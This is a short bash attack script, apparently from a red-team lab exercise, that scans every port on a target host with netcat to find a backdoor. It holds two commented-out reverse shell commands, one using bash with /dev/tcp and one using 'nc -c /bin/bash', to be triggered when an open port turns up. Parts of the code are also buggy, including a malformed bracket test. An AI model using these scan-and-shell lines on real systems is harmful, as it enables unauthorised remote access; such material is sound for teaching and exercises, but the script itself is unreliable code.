#!/bin/bash

# search through all open ports on blue.usc-bank5.usc430 for a backdoor
# if a backdoor exists, open a reverse shell
# if a backdoor does not exist, sleep for 5 minutes and try again


# Define the remote host and port
remote_host="1.1.1.5"
remote_port=0

while true
do
    # skips over the ssh port and the rpc port
    if [ $remote_port == 22 -o $remote_port == 111 ]; then
        ((remote_port++))
    fi

    # Try to connect to the remote host using nc
    if nc -zv $remote_host $remote_port &> /dev/null; then
    
        echo "Open Port Found!! Port = $remote_port"
    
        ## THE FOLLOWING TWO LINES ARE TWO DIFFERENT REVERSE SHELL COMMANDS
        # bash syntax
        # /bin/bash -i >& /dev/tcp/1.1.1.5/$remote_port 0>&1
        
        #using netcat
        #nc -c /bin/bash $remote_host $remote_port

        # bind port


        # break # break out of while loop
    # else
        # echo "Connection refused on port $remote_port, trying next port."
        
    fi

    ((remote_port++))

    if [[$remote_port > 65535]]; then
        break
    fi

done


